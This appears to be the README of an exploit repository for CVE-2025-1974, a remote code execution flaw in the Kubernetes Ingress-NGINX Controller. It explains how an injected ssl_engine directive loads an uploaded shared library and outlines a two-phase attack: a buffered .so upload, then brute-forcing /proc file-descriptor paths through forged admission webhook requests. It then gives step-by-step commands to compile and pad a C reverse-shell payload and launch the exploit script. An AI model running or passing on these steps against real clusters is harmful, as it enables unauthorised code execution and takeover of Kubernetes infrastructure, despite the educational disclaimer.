# CVE-2025-1974 – Ingress-NGINX Arbitrary Code Execution Exploit

> ⚠️ For educational and authorized security research purposes only.

## 🔥 CVE-2025-1974 Overview

**CVE-2025-1974** is a critical remote code execution vulnerability in the **Kubernetes Ingress-NGINX Controller**. It allows an **unauthenticated attacker** to execute **arbitrary code inside the Ingress controller pod**, by abusing how custom annotations are processed during NGINX config reloads.

### Root Cause

Ingress-NGINX supports annotations like `auth-url` that get inserted into the live NGINX config. An attacker can smuggle **NGINX directives** using crafted annotation values (e.g., `ssl_engine`) which get injected into the config and are **executed during validation**.

When the `nginx -t` test validates a malicious `ssl_engine` directive pointing to a temporary uploaded `.so` file, NGINX tries to **dynamically load and execute** it via OpenSSL, causing **arbitrary code execution**.

## 🧠 Exploit Summary

This exploit works in **two phases**:

1. **Upload Phase**  
   A `.so` payload (compiled shared library) is uploaded to the NGINX ingress controller using a crafted POST request that **triggers NGINX buffering**, keeping the file open via a file descriptor (FD).

2. **Trigger Phase**  
   The attacker brute-forces `/proc/<pid>/fd/<fd>` combinations by sending forged `AdmissionReview` requests to the **admission webhook**, injecting a malicious `auth-url` that contains:
   ```nginx
   ssl_engine /proc/<pid>/fd/<fd>;

   ## 🚀 Exploit Launch Guide

Once you've prepared the following:

- ✅ `shell.c` — Your C reverse shell payload  
- ✅ `shell.so` — Compiled & padded `.so` shared object  
- ✅ `exploit.py` — The main Python exploit script  
- ✅ `requirements.txt` — Python dependencies

---

###  Steps

```bash
###📦 1.Install requirements
pip3 install -r requirements.txt

###🧨 2. Compile & Pad Payload
gcc -shared -fPIC -o shell.so shell.c
python3 -c "import os; f=open('shell.so','ab'); f.write(b'\x00'*(16384 - (os.path.getsize('shell.so') % 16384))); f.close()"

###💥 3. Launch Exploit
python3 exploit.py \
  --upload-url http://127.0.0.1:8080 \
  --admission-url https://127.0.0.1:8443 \
  --shell shell.so \
  --pid-start 26 \
  --pid-end 40 \
  --fd-start 1 \
  --fd-end 100




